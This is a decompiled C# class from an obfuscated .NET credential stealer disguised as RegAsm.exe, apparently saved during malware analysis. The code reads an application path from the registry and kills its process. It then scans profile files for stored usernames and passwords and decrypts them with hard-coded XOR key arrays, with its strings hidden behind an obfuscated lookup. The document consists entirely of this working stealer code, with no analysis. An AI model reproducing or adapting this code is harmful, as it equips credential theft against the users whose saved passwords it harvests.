// Decompiled with JetBrains decompiler
// Type: S9.Jk
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using Microsoft.Win32;
using rw;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using VW1;

namespace S9
{
  internal class Jk
  {
    private static Jk He;

    public static string VQ()
    {
      try
      {
        if (!Convert.ToBoolean(XWr.EnableBrowserRecovery))
          return w4.bx(666, w4.vY);
        try
        {
          Registry.LocalMachine.OpenSubKey(w4.bx(1048, w4.vY)).GetValue("").ToString();
        }
        catch
        {
          return w4.bx(686, w4.vY);
        }
        List<NT> ntList = Tu.bx(Tu.aG);
        StringBuilder stringBuilder = new StringBuilder();
        foreach (NT nt in ntList)
        {
          stringBuilder.AppendLine(w4.bx(1160, w4.vY) + JC.bx((object) nt, JC.TU));
          stringBuilder.AppendLine(w4.bx(1176, w4.vY) + JC.bx((object) nt, JC.fa));
          stringBuilder.AppendLine(w4.bx(1200, w4.vY) + JC.bx((object) nt, JC.Mv));
          stringBuilder.AppendLine(w4.bx(1224, w4.vY));
          stringBuilder.AppendLine(w4.bx(1270, w4.vY));
        }
        if (string.IsNullOrWhiteSpace(stringBuilder.ToString()))
          return w4.bx(934, w4.vY);
        XWr.IsPass = true;
        return stringBuilder.ToString();
      }
      catch
      {
      }
      return "";
    }

    public static List<NT> xK()
    {
      List<NT> ntList1 = new List<NT>();
      try
      {
        foreach (Process process in Process.GetProcesses())
        {
          try
          {
            if (process.ProcessName == w4.bx(1332, w4.vY))
              process.Kill();
          }
          catch
          {
          }
        }
        Thread.Sleep(1000);
      }
      catch
      {
      }
      try
      {
        string str1 = Registry.LocalMachine.OpenSubKey(w4.bx(1048, w4.vY)).GetValue("").ToString();
        foreach (string directory in Directory.GetDirectories(str1.Remove(str1.LastIndexOf(w4.bx(1350, w4.vY))).Replace(w4.bx(1376, w4.vY), "") + w4.bx(1382, w4.vY), w4.bx(1402, w4.vY), SearchOption.TopDirectoryOnly))
        {
          string str2 = directory.Substring(directory.LastIndexOf(w4.bx(1412, w4.vY)) + 1);
          FileStream fileStream = new FileStream(directory + w4.bx(1418, w4.vY), FileMode.Open);
          int length = (int) fileStream.Length;
          byte[] buffer = new byte[length];
          bool flag = false;
          string str3 = "";
          fileStream.Read(buffer, 0, length);
          int num = buffer[0] != (byte) 208 ? 1 : 0;
          for (int index1 = 0; index1 < length; ++index1)
          {
            if (buffer[index1] > (byte) 32 && buffer[index1] < (byte) 127 && buffer[index1] != (byte) 61)
            {
              string str4 = str3;
              char ch = (char) buffer[index1];
              string str5 = ch.ToString();
              str3 = str4 + str5;
              string str6 = "";
              if (str3.Equals(w4.bx(1466, w4.vY)) || str3.Equals(w4.bx(1484, w4.vY)))
              {
                int index2 = index1 + 9;
                if (num == 0)
                  index2 = index1 + 2;
                for (; buffer[index2] > (byte) 32 && buffer[index2] < (byte) 127; ++index2)
                {
                  string str7 = str6;
                  ch = (char) buffer[index2];
                  string str8 = ch.ToString();
                  str6 = str7 + str8;
                }
                flag = true;
                index1 = index2;
              }
              else if (flag && (str3.Equals(w4.bx(1510, w4.vY)) || str3.Equals(w4.bx(1530, w4.vY))))
              {
                int index2 = index1 + 9;
                if (num == 0)
                  index2 = index1 + 2;
                string str7 = "";
                for (; buffer[index2] > (byte) 32 && buffer[index2] < (byte) 127; ++index2)
                {
                  string str8 = str7;
                  ch = (char) buffer[index2];
                  string str9 = ch.ToString();
                  str7 = str8 + str9;
                }
                List<NT> ntList2 = ntList1;
                NT nt = new NT();
                yJ.bx((object) nt, "", yJ.qc);
                yJ.bx((object) nt, str2, yJ.rL);
                yJ.bx((object) nt, bb.bx(num, str7, bb.wy), yJ.aQ);
                ntList2.Add(nt);
                break;
              }
            }
            else
              str3 = "";
          }
          fileStream.Close();
        }
      }
      catch
      {
        return ntList1;
      }
      return ntList1;
    }

    private static string Ld(int _param0, string _param1)
    {
      int num1 = 1;
label_1:
      int num2 = num1;
      int[] numArray1;
      int[] numArray2;
      string str;
      int num3;
      int length;
      int[] numArray3;
      int index1;
      int[] numArray4;
      int[] numArray5;
      int startIndex;
      while (true)
      {
        switch (num2)
        {
          case 1:
            str = "";
            if (Jk.Vp())
            {
              num2 = 0;
              continue;
            }
            goto label_1;
          case 2:
            ++index1;
            num2 = 4;
            continue;
          case 3:
            int[] numArray6 = new int[length];
            for (int index2 = 0; index2 < length; ++index2)
            {
              numArray6[index2] = Convert.ToInt32(_param1.Substring(startIndex, 2), 16);
              startIndex += 2;
            }
            numArray1 = new int[numArray6.Length];
            numArray1[0] = numArray6[0] ^ num3;
            Array.Copy((Array) numArray6, 1, (Array) numArray1, 1, numArray6.Length - 1);
            while (numArray6.Length > numArray2.Length)
            {
              int[] numArray7 = new int[numArray2.Length * 2];
              Array.Copy((Array) numArray2, 0, (Array) numArray7, 0, numArray2.Length);
              Jk.zV((object) numArray2, 0, (object) numArray7, numArray2.Length, numArray2.Length);
              numArray5 = (int[]) null;
              numArray2 = numArray7;
            }
            numArray4 = new int[numArray6.Length];
            for (int index2 = 1; index2 < numArray6.Length; ++index2)
              numArray4[index2 - 1] = numArray6[index2] ^ numArray2[index2 - 1];
            numArray3 = new int[numArray4.Length];
            index1 = 0;
            goto case 4;
          case 4:
            if (index1 < numArray4.Length - 1)
            {
              numArray3[index1] = numArray4[index1] - numArray1[index1] >= 0 ? numArray4[index1] - numArray1[index1] : numArray4[index1] + (int) byte.MaxValue - numArray1[index1];
              str += ((char) numArray3[index1]).ToString();
              if (Jk.Vp())
              {
                num2 = 2;
                continue;
              }
              goto label_1;
            }
            else
              goto label_18;
          case 5:
            length = _param1.Length / 2;
            startIndex = 0;
            num2 = 3;
            continue;
          default:
            numArray2 = new int[8]
            {
              126,
              100,
              114,
              97,
              71,
              111,
              110,
              126
            };
            int[] numArray8 = new int[8]
            {
              126,
              70,
              64,
              55,
              37,
              109,
              36,
              126
            };
            num3 = Convert.ToInt32(w4.bx(1558, w4.vY), 16);
            if (_param0 == 1)
            {
              numArray5 = (int[]) null;
              numArray2 = numArray8;
              num3 = Jk.wr((object) w4.bx(1566, w4.vY), 16);
              num2 = Jk.RK() == null ? 5 : 2;
              continue;
            }
            goto case 5;
        }
      }
label_18:
      return str;
    }

    public Jk()
    {
      yd.bx(yd.EI);
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }

    internal static bool Vp() => Jk.He == null;

    internal static Jk RK() => Jk.He;

    internal static int wr([In] object obj0, [In] int obj1) => Convert.ToInt32((string) obj0, obj1);

    internal static void zV([In] object obj0, [In] int obj1, [In] object obj2, [In] int obj3, [In] int obj4) => Array.Copy((Array) obj0, obj1, (Array) obj2, obj3, obj4);
  }
}
